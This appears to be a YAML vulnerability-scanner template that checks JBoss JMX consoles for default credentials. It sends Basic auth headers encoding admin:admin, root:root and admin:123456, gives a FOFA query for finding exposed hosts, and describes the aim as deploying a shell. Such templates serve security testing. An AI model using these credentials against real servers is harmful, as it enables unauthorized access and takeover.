expression: r0() || r1() || r2() || r3()
id: jboss-default-password
info:
  author: paradessia
  description: "\u5229\u7528jboss.deployment\u90E8\u7F72shell\nfofa: \"jmx-console\"\
    \n"
  name: JBoss JMX Console Weak Credential Discovery
  reference:
  - https://xz.aliyun.com/t/6103
  severity: high
  verified: true
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b"jboss.management.local")
      && response.body.bcontains(b"jboss.web")
    request:
      method: GET
      path: /jmx-console/
  r1:
    expression: response.status == 200 && response.body.bcontains(b'JMImplementation')
    headers:
      Authorization: Basic YWRtaW46YWRtaW4=
    method: GET
    path: /jmx-console/
    request: null
  r2:
    expression: response.status == 200 && response.body.bcontains(b'JMImplementation')
    headers:
      Authorization: Basic cm9vdDpyb290
    method: GET
    path: /jmx-console/
    request: null
  r3:
    expression: response.status == 200 && response.body.bcontains(b'JMImplementation')
    headers:
      Authorization: Basic YWRtaW46MTIzNDU2
    method: GET
    path: /jmx-console/
    request: null
